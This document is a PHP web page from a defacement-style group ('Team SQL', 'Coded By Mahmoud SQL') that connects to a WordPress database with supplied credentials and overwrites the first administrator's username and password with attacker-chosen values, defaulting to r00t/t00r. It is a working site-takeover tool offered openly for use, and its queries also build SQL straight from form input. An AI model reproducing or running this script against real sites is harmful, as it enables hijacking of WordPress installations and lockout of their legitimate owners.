<title>Team SQL ###</title>
<html>
<style>
input, select, text {
background-color: white;
border-style: white;
border-width: 1px;
font-family: verdana, arial, sans-serif;
font-size: 11px;
color: green;
padding: 0px;
</style>
<head>

<table id="table2" style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" width="100%" 

bgcolor="black" border="1" cellpadding="5" cellspacing="0">

  <tbody>
  <tr>
    <td style="font-size: 11px; color: rgb(217, 217, 217); verdana, arial, sans-serif" valign="top" width="100%">
      <center><b>

</style>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

<div align="center">
<center><p><font size="5" color="red">#...Change Password of Admin Wordpress ...#</center>
</font><font size="7" color="red"></p>
<center><p><font size="6"><a href="http://www.team-sql.com/cc">
<font color="#FF0000">#..Team SQL..#</font></a></center></font><font size="6" color="white"></p>
<p><a href="http://WWW.TEAM-SQL.COM">WWW.TEAM-SQL.COM</a></p>
<p>Coded By Mahmoud SQL </p>
<p><span lang="ar-jo">&#1587;&#1603;&#1585;&#1576;&#1578; &#1578;&#1594;&#1610;&#1585; &#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1575;&#1583;&#1605;&#1606; &#1604;&#1587;&#1603;&#1585;&#1576;&#1578; &#1608;&#1585;&#1583; &#1576;&#1585;&#1587; </span></p>
<center>
<center><p><font size="5" color="white"><br></font></font></b><font size="6">
Greetz : &gt;Mr SohayL&nbsp; # Mr Danger # Tnt HACKER # </br></center></font><b>

<font size="6" color="white"><font size="5" color="white"></p>


&nbsp;</font></font></b></font></table>
</center>
<br></br>

<center>



</head>
    <body bgcolor="black" text="green">
       <div align="center">  
</div> 
      <?
if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"wp-\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"wp-\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
      <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"r00t\"><br>
Set A New password 4 Login : <INPUT name=\"pwd\" size=\"15\" value=\"t00r\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());

if($a4s){
echo "<b>root@secure:# ~ Success :now use a new user and pass 2 login in the admin panel</b> ";
}

}

?>
<br></br>
<br></br>
<br></br>
<br>&nbsp;<p><font color="#FF0000">Coded By Mahmoud SQL</font></p>